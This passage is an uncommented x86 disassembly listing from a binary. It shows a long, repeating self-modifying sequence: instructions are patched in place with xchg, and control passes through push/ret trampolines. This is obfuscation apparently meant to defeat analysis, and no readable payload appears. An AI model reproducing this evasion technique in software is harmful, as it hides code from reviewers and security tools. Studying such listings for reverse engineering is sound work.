  40d5a5:	55                   	push   %ebp
  40d5a6:	00 50 66             	add    %dl,0x66(%eax)
  40d5a9:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40d5ae:	05 a2 d5 40 00       	add    $0x40d5a2,%eax
  40d5b3:	b8 55 28 f0 c2       	mov    $0xc2f02855,%eax
  40d5b8:	87 04 24             	xchg   %eax,(%esp)
  40d5bb:	c3                   	ret
  40d5bc:	8f 05 ea d5 40 00    	pop    0x40d5ea
  40d5c2:	50                   	push   %eax
  40d5c3:	90                   	nop
  40d5c4:	b8 15 20 40 00       	mov    $0x402015,%eax
  40d5c9:	8d 80 a5 48 10 40    	lea    0x401048a5(%eax),%eax
  40d5cf:	87 05 d8 d5 40 00    	xchg   %eax,0x40d5d8
  40d5d5:	58                   	pop    %eax
  40d5d6:	f3 90                	pause
  40d5d8:	cd c3                	int    $0xc3
  40d5da:	d3 bc 00 50 66 b8 eb 	sarl   %cl,-0x144799b0(%eax,%eax,1)
  40d5e1:	e8 66 87 05 d8       	call   0xd8465d4c
  40d5e6:	d5 40                	aad    $0x40
  40d5e8:	00 b8 54 b3 32 d1    	add    %bh,-0x2ecd4cac(%eax)
  40d5ee:	87 04 24             	xchg   %eax,(%esp)
  40d5f1:	c3                   	ret
  40d5f2:	8f 05 20 d6 40 00    	pop    0x40d620
  40d5f8:	50                   	push   %eax
  40d5f9:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40d5ff:	8d 80 a3 e1 bf ff    	lea    -0x401e5d(%eax),%eax
  40d605:	87 05 0e d6 40 00    	xchg   %eax,0x40d60e
  40d60b:	58                   	pop    %eax
  40d60c:	f3 90                	pause
  40d60e:	08 fd                	or     %bh,%ch
  40d610:	1f                   	pop    %ds
  40d611:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40d612:	00 50 66             	add    %dl,0x66(%eax)
  40d615:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40d61a:	05 0e d6 40 00       	add    $0x40d60e,%eax
  40d61f:	b8 a4 90 f3 46       	mov    $0x46f390a4,%eax
  40d624:	87 04 24             	xchg   %eax,(%esp)
  40d627:	c3                   	ret
  40d628:	8f 05 57 d6 40 00    	pop    0x40d657
  40d62e:	50                   	push   %eax
  40d62f:	90                   	nop
  40d630:	b8 15 20 40 00       	mov    $0x402015,%eax
  40d635:	8d 80 fa 63 c1 3b    	lea    0x3bc163fa(%eax),%eax
  40d63b:	87 05 44 d6 40 00    	xchg   %eax,0x40d644
  40d641:	58                   	pop    %eax
  40d642:	f3 90                	pause
  40d644:	e7 f5                	out    %eax,$0xf5
  40d646:	87 50 ff             	xchg   %edx,-0x1(%eax)
  40d649:	ff 50 66             	call   *0x66(%eax)
  40d64c:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40d651:	05 44 d6 40 00       	add    $0x40d644,%eax
  40d656:	b8 fe c1 af f4       	mov    $0xf4afc1fe,%eax
  40d65b:	8d 40 01             	lea    0x1(%eax),%eax
  40d65e:	87 04 24             	xchg   %eax,(%esp)
  40d661:	c3                   	ret
  40d662:	8f 05 90 d6 40 00    	pop    0x40d690
  40d668:	50                   	push   %eax
  40d669:	90                   	nop
  40d66a:	b8 15 20 40 00       	mov    $0x402015,%eax
  40d66f:	8d 80 d4 7c fa fe    	lea    -0x105832c(%eax),%eax
  40d675:	87 05 7e d6 40 00    	xchg   %eax,0x40d67e
  40d67b:	58                   	pop    %eax
  40d67c:	f3 90                	pause
  40d67e:	8a 82 42 bc ff 50    	mov    0x50ffbc42(%edx),%al
  40d684:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40d688:	66 87 05 7e d6 40 00 	xchg   %ax,0x40d67e
  40d68f:	b8 cc b2 8e ff       	mov    $0xff8eb2cc,%eax
  40d694:	87 04 24             	xchg   %eax,(%esp)
  40d697:	c3                   	ret
  40d698:	8f 05 c6 d6 40 00    	pop    0x40d6c6
  40d69e:	50                   	push   %eax
  40d69f:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40d6a5:	8d 80 d3 18 1b ff    	lea    -0xe4e72d(%eax),%eax
  40d6ab:	87 05 b4 d6 40 00    	xchg   %eax,0x40d6b4
  40d6b1:	58                   	pop    %eax
  40d6b2:	f3 90                	pause
  40d6b4:	bc 07 e5 be ff       	mov    $0xffbee507,%esp
  40d6b9:	50                   	push   %eax
  40d6ba:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40d6be:	66 87 05 b4 d6 40 00 	xchg   %ax,0x40d6b4
  40d6c5:	b8 12 f2 1f de       	mov    $0xde1ff212,%eax
  40d6ca:	87 04 24             	xchg   %eax,(%esp)
  40d6cd:	c3                   	ret
  40d6ce:	8f 05 fd d6 40 00    	pop    0x40d6fd
  40d6d4:	50                   	push   %eax
  40d6d5:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40d6db:	8d 80 ea 15 30 57    	lea    0x573015ea(%eax),%eax
  40d6e1:	87 05 ea d6 40 00    	xchg   %eax,0x40d6ea
  40d6e7:	58                   	pop    %eax
  40d6e8:	f3 90                	pause
  40d6ea:	8a 10                	mov    (%eax),%dl
  40d6ec:	61                   	popa
  40d6ed:	b1 40                	mov    $0x40,%cl
  40d6ef:	00 50 66             	add    %dl,0x66(%eax)
  40d6f2:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40d6f7:	05 ea d6 40 00       	add    $0x40d6ea,%eax
  40d6fc:	b8 05 8a e9 f5       	mov    $0xf5e98a05,%eax
  40d701:	8d 40 01             	lea    0x1(%eax),%eax
  40d704:	87 04 24             	xchg   %eax,(%esp)
  40d707:	c3                   	ret
  40d708:	8f 05 36 d7 40 00    	pop    0x40d736
  40d70e:	50                   	push   %eax
  40d70f:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40d715:	8d 80 d3 b2 1c ff    	lea    -0xe34d2d(%eax),%eax
  40d71b:	87 05 24 d7 40 00    	xchg   %eax,0x40d724
  40d721:	58                   	pop    %eax
  40d722:	f3 90                	pause
  40d724:	98                   	cwtl
  40d725:	e9 35 c6 ff 50       	jmp    0x51409d5f
  40d72a:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40d72e:	66 87 05 24 d7 40 00 	xchg   %ax,0x40d724
  40d735:	b8 ff 71 28 11       	mov    $0x112871ff,%eax
  40d73a:	87 04 24             	xchg   %eax,(%esp)
  40d73d:	c3                   	ret
  40d73e:	8f 05 6c d7 40 00    	pop    0x40d76c
  40d744:	50                   	push   %eax
  40d745:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40d74b:	8d 80 a5 3c 10 40    	lea    0x40103ca5(%eax),%eax
  40d751:	87 05 5a d7 40 00    	xchg   %eax,0x40d75a
  40d757:	58                   	pop    %eax
  40d758:	f3 90                	pause
  40d75a:	52                   	push   %edx
  40d75b:	21 ce                	and    %ecx,%esi
  40d75d:	e8 00 50 66 b8       	call   0xb8a72762
  40d762:	eb e8                	jmp    0x40d74c
  40d764:	66 87 05 5a d7 40 00 	xchg   %ax,0x40d75a
  40d76b:	b8 db e5 22 ce       	mov    $0xce22e5db,%eax
  40d770:	87 04 24             	xchg   %eax,(%esp)
  40d773:	c3                   	ret
  40d774:	8f 05 a2 d7 40 00    	pop    0x40d7a2
  40d77a:	50                   	push   %eax
  40d77b:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40d781:	8d 80 d3 53 08 ff    	lea    -0xf7ac2d(%eax),%eax
  40d787:	87 05 90 d7 40 00    	xchg   %eax,0x40d790
  40d78d:	58                   	pop    %eax
  40d78e:	f3 90                	pause
  40d790:	50                   	push   %eax
  40d791:	8b ea                	mov    %edx,%ebp
  40d793:	0d ff 50 66 b8       	or     $0xb86650ff,%eax
  40d798:	eb e8                	jmp    0x40d782
  40d79a:	66 87 05 90 d7 40 00 	xchg   %ax,0x40d790
  40d7a1:	b8 e7 f4 e2 43       	mov    $0x43e2f4e7,%eax
  40d7a6:	87 04 24             	xchg   %eax,(%esp)
  40d7a9:	c3                   	ret
  40d7aa:	8f 05 d9 d7 40 00    	pop    0x40d7d9
  40d7b0:	50                   	push   %eax
  40d7b1:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40d7b7:	8d 80 ea 15 34 57    	lea    0x573415ea(%eax),%eax
  40d7bd:	87 05 c6 d7 40 00    	xchg   %eax,0x40d7c6
  40d7c3:	58                   	pop    %eax
  40d7c4:	f3 90                	pause
  40d7c6:	bd 05 91 b0 40       	mov    $0x40b09105,%ebp
  40d7cb:	00 50 66             	add    %dl,0x66(%eax)
  40d7ce:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40d7d3:	05 c6 d7 40 00       	add    $0x40d7c6,%eax
  40d7d8:	b8 99 d4 be 22       	mov    $0x22bed499,%eax
  40d7dd:	8d 40 01             	lea    0x1(%eax),%eax
  40d7e0:	87 04 24             	xchg   %eax,(%esp)
  40d7e3:	c3                   	ret
  40d7e4:	8f 05 12 d8 40 00    	pop    0x40d812
  40d7ea:	50                   	push   %eax
  40d7eb:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40d7f1:	8d 80 53 e1 bf ff    	lea    -0x401ead(%eax),%eax
  40d7f7:	87 05 00 d8 40 00    	xchg   %eax,0x40d800
  40d7fd:	58                   	pop    %eax
  40d7fe:	f3 90                	pause
  40d800:	9b                   	fwait
  40d801:	c1 d4 38             	rcl    $0x38,%esp
  40d804:	00 50 66             	add    %dl,0x66(%eax)
  40d807:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40d80c:	05 00 d8 40 00       	add    $0x40d800,%eax
  40d811:	b8 51 9d 07 0d       	mov    $0xd079d51,%eax
  40d816:	87 04 24             	xchg   %eax,(%esp)
  40d819:	c3                   	ret
  40d81a:	8f 05 49 d8 40 00    	pop    0x40d849
  40d820:	50                   	push   %eax
  40d821:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40d827:	8d 80 ea 15 34 57    	lea    0x573415ea(%eax),%eax
  40d82d:	87 05 36 d8 40 00    	xchg   %eax,0x40d836
  40d833:	58                   	pop    %eax
  40d834:	f3 90                	pause
  40d836:	8c 71 bb             	mov    %?,-0x45(%ecx)
  40d839:	20 40 00             	and    %al,0x0(%eax)
  40d83c:	50                   	push   %eax
  40d83d:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40d841:	66 87 05 36 d8 40 00 	xchg   %ax,0x40d836
  40d848:	b8 a4 4c 7c a0       	mov    $0xa07c4ca4,%eax
  40d84d:	8d 40 01             	lea    0x1(%eax),%eax
  40d850:	87 04 24             	xchg   %eax,(%esp)
  40d853:	c3                   	ret
  40d854:	8f 05 82 d8 40 00    	pop    0x40d882
  40d85a:	50                   	push   %eax
  40d85b:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40d861:	8d 80 d3 4b 1e ff    	lea    -0xe1b42d(%eax),%eax
  40d867:	87 05 70 d8 40 00    	xchg   %eax,0x40d870
  40d86d:	58                   	pop    %eax
  40d86e:	f3 90                	pause
  40d870:	2b 47 cc             	sub    -0x34(%edi),%eax
  40d873:	21 ff                	and    %edi,%edi
  40d875:	50                   	push   %eax
  40d876:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40d87a:	66 87 05 70 d8 40 00 	xchg   %ax,0x40d870
  40d881:	b8 f5 8b da 2b       	mov    $0x2bda8bf5,%eax
  40d886:	87 04 24             	xchg   %eax,(%esp)
  40d889:	c3                   	ret
  40d88a:	8f 05 b8 d8 40 00    	pop    0x40d8b8
  40d890:	50                   	push   %eax
  40d891:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40d897:	8d 80 a5 00 10 40    	lea    0x401000a5(%eax),%eax
  40d89d:	87 05 a6 d8 40 00    	xchg   %eax,0x40d8a6
  40d8a3:	58                   	pop    %eax
  40d8a4:	f3 90                	pause
  40d8a6:	ff                   	ljmp   (bad)
  40d8a7:	ea 9f 13 00 50 66 b8 	ljmp   $0xb866,$0x5000139f
  40d8ae:	eb e8                	jmp    0x40d898
  40d8b0:	66 87 05 a6 d8 40 00 	xchg   %ax,0x40d8a6
  40d8b7:	b8 b8 d9 4b 64       	mov    $0x644bd9b8,%eax
  40d8bc:	87 04 24             	xchg   %eax,(%esp)
  40d8bf:	c3                   	ret
  40d8c0:	8f 05 ee d8 40 00    	pop    0x40d8ee
  40d8c6:	50                   	push   %eax
  40d8c7:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40d8cd:	8d 80 d3 df 1d ff    	lea    -0xe2202d(%eax),%eax
  40d8d3:	87 05 dc d8 40 00    	xchg   %eax,0x40d8dc
  40d8d9:	58                   	pop    %eax
  40d8da:	f3 90                	pause
  40d8dc:	bd 1c 46 e6 ff       	mov    $0xffe6461c,%ebp
  40d8e1:	50                   	push   %eax
  40d8e2:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40d8e6:	66 87 05 dc d8 40 00 	xchg   %ax,0x40d8dc
  40d8ed:	b8 31 d8 93 43       	mov    $0x4393d831,%eax
  40d8f2:	87 04 24             	xchg   %eax,(%esp)
  40d8f5:	c3                   	ret
  40d8f6:	8f 05 24 d9 40 00    	pop    0x40d924
  40d8fc:	50                   	push   %eax
  40d8fd:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40d903:	8d 80 d3 a9 1d ff    	lea    -0xe2562d(%eax),%eax
  40d909:	87 05 12 d9 40 00    	xchg   %eax,0x40d912
  40d90f:	58                   	pop    %eax
  40d910:	f3 90                	pause
  40d912:	97                   	xchg   %eax,%edi
  40d913:	27                   	daa
  40d914:	6d                   	insl   (%dx),%es:(%edi)
  40d915:	6a ff                	push   $0xffffffff
  40d917:	50                   	push   %eax
  40d918:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40d91c:	66 87 05 12 d9 40 00 	xchg   %ax,0x40d912
  40d923:	b8 32 d0 ca 0f       	mov    $0xfcad032,%eax
  40d928:	87 04 24             	xchg   %eax,(%esp)
  40d92b:	c3                   	ret
  40d92c:	8f 05 5b d9 40 00    	pop    0x40d95b
  40d932:	50                   	push   %eax
  40d933:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40d939:	8d 80 76 f5 33 50    	lea    0x5033f576(%eax),%eax
  40d93f:	87 05 48 d9 40 00    	xchg   %eax,0x40d948
  40d945:	58                   	pop    %eax
  40d946:	f3 90                	pause
  40d948:	bd b1 fc d7 40       	mov    $0x40d7fcb1,%ebp
  40d94d:	00 50 66             	add    %dl,0x66(%eax)
  40d950:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40d955:	05 48 d9 40 00       	add    $0x40d948,%eax
  40d95a:	b8 cb da 4a 4d       	mov    $0x4d4adacb,%eax
  40d95f:	8d 40 01             	lea    0x1(%eax),%eax
  40d962:	87 04 24             	xchg   %eax,(%esp)
  40d965:	c3                   	ret
  40d966:	8f 05 94 d9 40 00    	pop    0x40d994
  40d96c:	50                   	push   %eax
  40d96d:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40d973:	8d 80 d3 43 f7 fe    	lea    -0x108bc2d(%eax),%eax
  40d979:	87 05 82 d9 40 00    	xchg   %eax,0x40d982
  40d97f:	58                   	pop    %eax
  40d980:	f3 90                	pause
  40d982:	33 a4 d3 34 ff 50 66 	xor    0x6650ff34(%ebx,%edx,8),%esp
  40d989:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40d98e:	05 82 d9 40 00       	add    $0x40d982,%eax
  40d993:	b8 6c d2 80 45       	mov    $0x4580d26c,%eax
  40d998:	87 04 24             	xchg   %eax,(%esp)
  40d99b:	c3                   	ret
  40d99c:	8f 05 cb d9 40 00    	pop    0x40d9cb
  40d9a2:	50                   	push   %eax
  40d9a3:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40d9a9:	8d 80 7a e5 33 57    	lea    0x5733e57a(%eax),%eax
  40d9af:	87 05 b8 d9 40 00    	xchg   %eax,0x40d9b8
  40d9b5:	58                   	pop    %eax
  40d9b6:	f3 90                	pause
  40d9b8:	72 fc                	jb     0x40d9b6
  40d9ba:	9b                   	fwait
  40d9bb:	34 40                	xor    $0x40,%al
  40d9bd:	00 50 66             	add    %dl,0x66(%eax)
  40d9c0:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40d9c5:	05 b8 d9 40 00       	add    $0x40d9b8,%eax
  40d9ca:	b8 11 f1 05 e2       	mov    $0xe205f111,%eax
  40d9cf:	8d 40 01             	lea    0x1(%eax),%eax
  40d9d2:	87 04 24             	xchg   %eax,(%esp)
  40d9d5:	c3                   	ret
  40d9d6:	8f 05 04 da 40 00    	pop    0x40da04
  40d9dc:	50                   	push   %eax
  40d9dd:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40d9e3:	8d 80 a5 33 10 40    	lea    0x401033a5(%eax),%eax
  40d9e9:	87 05 f2 d9 40 00    	xchg   %eax,0x40d9f2
  40d9ef:	58                   	pop    %eax
  40d9f0:	f3 90                	pause
  40d9f2:	4b                   	dec    %ebx
  40d9f3:	b3 5f                	mov    $0x5f,%bl
  40d9f5:	23 00                	and    (%eax),%eax
  40d9f7:	50                   	push   %eax
  40d9f8:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40d9fc:	66 87 05 f2 d9 40 00 	xchg   %ax,0x40d9f2
  40da03:	b8 26 99 0c bb       	mov    $0xbb0c9926,%eax
  40da08:	87 04 24             	xchg   %eax,(%esp)
  40da0b:	c3                   	ret
  40da0c:	8f 05 3a da 40 00    	pop    0x40da3a
  40da12:	50                   	push   %eax
  40da13:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40da19:	8d 80 d3 bb 05 ff    	lea    -0xfa442d(%eax),%eax
  40da1f:	87 05 28 da 40 00    	xchg   %eax,0x40da28
  40da25:	58                   	pop    %eax
  40da26:	f3 90                	pause
  40da28:	27                   	daa
  40da29:	a8 65                	test   $0x65,%al
  40da2b:	dd ff                	(bad)
  40da2d:	50                   	push   %eax
  40da2e:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40da32:	66 87 05 28 da 40 00 	xchg   %ax,0x40da28
  40da39:	b8 2f f5 17 c6       	mov    $0xc617f52f,%eax
  40da3e:	87 04 24             	xchg   %eax,(%esp)
  40da41:	c3                   	ret
  40da42:	8f 05 71 da 40 00    	pop    0x40da71
  40da48:	50                   	push   %eax
  40da49:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40da4f:	8d 80 ea 15 34 57    	lea    0x573415ea(%eax),%eax
  40da55:	87 05 5e da 40 00    	xchg   %eax,0x40da5e
  40da5b:	58                   	pop    %eax
  40da5c:	f3 90                	pause
  40da5e:	66 00 be d5 40 00 50 	data16 add %bh,0x500040d5(%esi)
  40da65:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40da69:	66 87 05 5e da 40 00 	xchg   %ax,0x40da5e
  40da70:	b8 ca b1 da b2       	mov    $0xb2dab1ca,%eax
  40da75:	8d 40 01             	lea    0x1(%eax),%eax
  40da78:	87 04 24             	xchg   %eax,(%esp)
  40da7b:	c3                   	ret
  40da7c:	8f 05 ab da 40 00    	pop    0x40daab
  40da82:	50                   	push   %eax
  40da83:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40da89:	8d 80 ea 15 34 57    	lea    0x573415ea(%eax),%eax
  40da8f:	87 05 98 da 40 00    	xchg   %eax,0x40da98
  40da95:	58                   	pop    %eax
  40da96:	f3 90                	pause
  40da98:	c3                   	ret
  40da99:	b2 ba                	mov    $0xba,%dl
  40da9b:	58                   	pop    %eax
  40da9c:	40                   	inc    %eax
  40da9d:	00 50 66             	add    %dl,0x66(%eax)
  40daa0:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40daa5:	05 98 da 40 00       	add    $0x40da98,%eax
  40daaa:	b8 96 d0 5f 2c       	mov    $0x2c5fd096,%eax
  40daaf:	8d 40 01             	lea    0x1(%eax),%eax
  40dab2:	87 04 24             	xchg   %eax,(%esp)
  40dab5:	c3                   	ret
  40dab6:	8f 05 e4 da 40 00    	pop    0x40dae4
  40dabc:	50                   	push   %eax
  40dabd:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40dac3:	8d 80 d3 e9 1b ff    	lea    -0xe4162d(%eax),%eax
  40dac9:	87 05 d2 da 40 00    	xchg   %eax,0x40dad2
  40dacf:	58                   	pop    %eax
  40dad0:	f3 90                	pause
  40dad2:	2e 4e                	cs dec %esi
  40dad4:	08 fd                	or     %bh,%ch
  40dad6:	ff 50 66             	call   *0x66(%eax)
  40dad9:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40dade:	05 d2 da 40 00       	add    $0x40dad2,%eax
  40dae3:	b8 16 22 a8 8b       	mov    $0x8ba82216,%eax
  40dae8:	87 04 24             	xchg   %eax,(%esp)
  40daeb:	c3                   	ret
  40daec:	8f 05 1a db 40 00    	pop    0x40db1a
  40daf2:	50                   	push   %eax
  40daf3:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40daf9:	8d 80 a5 00 10 40    	lea    0x401000a5(%eax),%eax
  40daff:	87 05 08 db 40 00    	xchg   %eax,0x40db08
  40db05:	58                   	pop    %eax
  40db06:	f3 90                	pause
  40db08:	f5                   	cmc
  40db09:	be da d1 00 50       	mov    $0x5000d1da,%esi
  40db0e:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40db12:	66 87 05 08 db 40 00 	xchg   %ax,0x40db08
  40db19:	b8 ec ae 42 aa       	mov    $0xaa42aeec,%eax
  40db1e:	87 04 24             	xchg   %eax,(%esp)
  40db21:	c3                   	ret
  40db22:	8f 05 50 db 40 00    	pop    0x40db50
  40db28:	50                   	push   %eax
  40db29:	90                   	nop
  40db2a:	b8 15 20 40 00       	mov    $0x402015,%eax
  40db2f:	8d 80 d3 7d 1b ff    	lea    -0xe4822d(%eax),%eax
  40db35:	87 05 3e db 40 00    	xchg   %eax,0x40db3e
  40db3b:	58                   	pop    %eax
  40db3c:	f3 90                	pause
  40db3e:	e9 48 81 83 ff       	jmp    0xffc45c8b
  40db43:	50                   	push   %eax
  40db44:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40db48:	66 87 05 3e db 40 00 	xchg   %ax,0x40db3e
  40db4f:	b8 fa 85 44 94       	mov    $0x944485fa,%eax
  40db54:	87 04 24             	xchg   %eax,(%esp)
  40db57:	c3                   	ret
  40db58:	8f 05 86 db 40 00    	pop    0x40db86
  40db5e:	50                   	push   %eax
  40db5f:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40db65:	8d 80 d3 47 1b ff    	lea    -0xe4b82d(%eax),%eax
  40db6b:	87 05 74 db 40 00    	xchg   %eax,0x40db74
  40db71:	58                   	pop    %eax
  40db72:	f3 90                	pause
  40db74:	9d                   	popf
  40db75:	16                   	push   %ss
  40db76:	1c 6b                	sbb    $0x6b,%al
  40db78:	ff 50 66             	call   *0x66(%eax)
  40db7b:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40db80:	05 74 db 40 00       	add    $0x40db74,%eax
  40db85:	b8 52 8d b3 70       	mov    $0x70b38d52,%eax
  40db8a:	87 04 24             	xchg   %eax,(%esp)
  40db8d:	c3                   	ret
  40db8e:	8f 05 bd db 40 00    	pop    0x40dbbd
  40db94:	50                   	push   %eax
  40db95:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40db9b:	8d 80 76 f5 33 50    	lea    0x5033f576(%eax),%eax
  40dba1:	87 05 aa db 40 00    	xchg   %eax,0x40dbaa
  40dba7:	58                   	pop    %eax
  40dba8:	f3 90                	pause
  40dbaa:	82 66 a5 14          	andb   $0x14,-0x5b(%esi)
  40dbae:	40                   	inc    %eax
  40dbaf:	00 50 66             	add    %dl,0x66(%eax)
  40dbb2:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40dbb7:	05 aa db 40 00       	add    $0x40dbaa,%eax
  40dbbc:	b8 bb 46 1c 2a       	mov    $0x2a1c46bb,%eax
  40dbc1:	8d 40 01             	lea    0x1(%eax),%eax
  40dbc4:	87 04 24             	xchg   %eax,(%esp)
  40dbc7:	c3                   	ret
  40dbc8:	8f 05 f6 db 40 00    	pop    0x40dbf6
  40dbce:	50                   	push   %eax
  40dbcf:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40dbd5:	8d 80 d3 73 f6 fe    	lea    -0x1098c2d(%eax),%eax
  40dbdb:	87 05 e4 db 40 00    	xchg   %eax,0x40dbe4
  40dbe1:	58                   	pop    %eax
  40dbe2:	f3 90                	pause
  40dbe4:	2c 35                	sub    $0x35,%al
  40dbe6:	41                   	inc    %ecx
  40dbe7:	d8 ff                	fdivr  %st(7),%st
  40dbe9:	50                   	push   %eax
  40dbea:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40dbee:	66 87 05 e4 db 40 00 	xchg   %ax,0x40dbe4
  40dbf5:	b8 b6 75 aa e0       	mov    $0xe0aa75b6,%eax
  40dbfa:	87 04 24             	xchg   %eax,(%esp)
  40dbfd:	c3                   	ret
  40dbfe:	8f 05 2c dc 40 00    	pop    0x40dc2c
  40dc04:	50                   	push   %eax
  40dc05:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40dc0b:	8d 80 a5 e9 bf ff    	lea    -0x40165b(%eax),%eax
  40dc11:	87 05 1a dc 40 00    	xchg   %eax,0x40dc1a
  40dc17:	58                   	pop    %eax
  40dc18:	f3 90                	pause
  40dc1a:	36 37                	ss aaa
  40dc1c:	47                   	inc    %edi
  40dc1d:	51                   	push   %ecx
  40dc1e:	00 50 66             	add    %dl,0x66(%eax)
  40dc21:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40dc26:	05 1a dc 40 00       	add    $0x40dc1a,%eax
  40dc2b:	b8 17 80 66 c1       	mov    $0xc1668017,%eax
  40dc30:	87 04 24             	xchg   %eax,(%esp)
  40dc33:	c3                   	ret
  40dc34:	8f 05 64 dc 40 00    	pop    0x40dc64
  40dc3a:	50                   	push   %eax
  40dc3b:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40dc41:	8d 80 b2 e4 e3 ff    	lea    -0x1c1b4e(%eax),%eax
  40dc47:	87 05 50 dc 40 00    	xchg   %eax,0x40dc50
  40dc4d:	58                   	pop    %eax
  40dc4e:	f3 90                	pause
  40dc50:	7e 69                	jle    0x40dcbb
  40dc52:	10 58 00             	adc    %bl,0x0(%eax)
  40dc55:	00 00                	add    %al,(%eax)
  40dc57:	50                   	push   %eax
  40dc58:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40dc5c:	66 87 05 50 dc 40 00 	xchg   %ax,0x40dc50
  40dc63:	b8 2f 90 ad 0c       	mov    $0xcad902f,%eax
  40dc68:	8d 40 02             	lea    0x2(%eax),%eax
  40dc6b:	87 04 24             	xchg   %eax,(%esp)
  40dc6e:	c3                   	ret
  40dc6f:	8f 05 9d dc 40 00    	pop    0x40dc9d
  40dc75:	50                   	push   %eax
  40dc76:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40dc7c:	8d 80 d3 50 03 ff    	lea    -0xfcaf2d(%eax),%eax
  40dc82:	87 05 8b dc 40 00    	xchg   %eax,0x40dc8b
  40dc88:	58                   	pop    %eax
  40dc89:	f3 90                	pause
  40dc8b:	19 e5                	sbb    %esp,%ebp
  40dc8d:	b7 13                	mov    $0x13,%bh
  40dc8f:	ff 50 66             	call   *0x66(%eax)
  40dc92:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40dc97:	05 8b dc 40 00       	add    $0x40dc8b,%eax
  40dc9c:	b8 82 7e 35 7a       	mov    $0x7a357e82,%eax
  40dca1:	87 04 24             	xchg   %eax,(%esp)
  40dca4:	c3                   	ret
  40dca5:	8f 05 d3 dc 40 00    	pop    0x40dcd3
  40dcab:	50                   	push   %eax
  40dcac:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40dcb2:	8d 80 53 df bf ff    	lea    -0x4020ad(%eax),%eax
  40dcb8:	87 05 c1 dc 40 00    	xchg   %eax,0x40dcc1
  40dcbe:	58                   	pop    %eax
  40dcbf:	f3 90                	pause
  40dcc1:	e2 80                	loop   0x40dc43
  40dcc3:	a1 43 ff 50 66       	mov    0x6650ff43,%eax
  40dcc8:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40dccd:	05 c1 dc 40 00       	add    $0x40dcc1,%eax
  40dcd2:	b8 bb 4a 0f 58       	mov    $0x580f4abb,%eax
  40dcd7:	87 04 24             	xchg   %eax,(%esp)
  40dcda:	c3                   	ret
  40dcdb:	8f 05 09 dd 40 00    	pop    0x40dd09
  40dce1:	50                   	push   %eax
  40dce2:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40dce8:	8d 80 d3 94 07 ff    	lea    -0xf86b2d(%eax),%eax
  40dcee:	87 05 f7 dc 40 00    	xchg   %eax,0x40dcf7
  40dcf4:	58                   	pop    %eax
  40dcf5:	f3 90                	pause
  40dcf7:	9c                   	pushf
  40dcf8:	ea 1b 2a ff 50 66 b8 	ljmp   $0xb866,$0x50ff2a1b
  40dcff:	eb e8                	jmp    0x40dce9
  40dd01:	66 87 05 f7 dc 40 00 	xchg   %ax,0x40dcf7
  40dd08:	b8 7e d5 6c c2       	mov    $0xc26cd57e,%eax
  40dd0d:	87 04 24             	xchg   %eax,(%esp)
  40dd10:	c3                   	ret
  40dd11:	8f 05 3f dd 40 00    	pop    0x40dd3f
  40dd17:	50                   	push   %eax
  40dd18:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40dd1e:	8d 80 6e 5c e4 03    	lea    0x3e45c6e(%eax),%eax
  40dd24:	87 05 2d dd 40 00    	xchg   %eax,0x40dd2d
  40dd2a:	58                   	pop    %eax
  40dd2b:	f3 90                	pause
  40dd2d:	c4 78 5a             	les    0x5a(%eax),%edi
  40dd30:	e5 00                	in     $0x0,%eax
  40dd32:	50                   	push   %eax
